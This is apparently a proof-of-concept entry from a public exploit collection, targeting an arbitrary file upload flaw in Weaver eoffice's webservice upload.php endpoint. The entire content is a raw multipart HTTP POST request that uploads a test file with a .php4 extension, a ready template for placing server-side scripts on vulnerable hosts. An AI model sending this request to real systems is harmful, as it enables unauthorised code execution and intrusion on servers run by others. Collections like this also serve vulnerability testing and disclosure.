# eoffice_upload.php_fileupload

from: https://github.com/wy876/POC/blob/main/%E6%B3%9B%E5%BE%AE-eoffice-webservice-file-upload%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.md
```
POST /webservice/upload/upload.php HTTP/1.1
Host:
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0) Gecko/20100101 Firefox/108.0
Accept-Encoding: gzip, deflate, br
Content-Type:multipart/form-data; boundary=--------------------------553898708333958420021355

----------------------------553898708333958420021355
Content-Disposition: form-data; name="file"; filename="qq_test.php4"
Content-Type: application/octet-stream

qqtest
----------------------------553898708333958420021355--
```
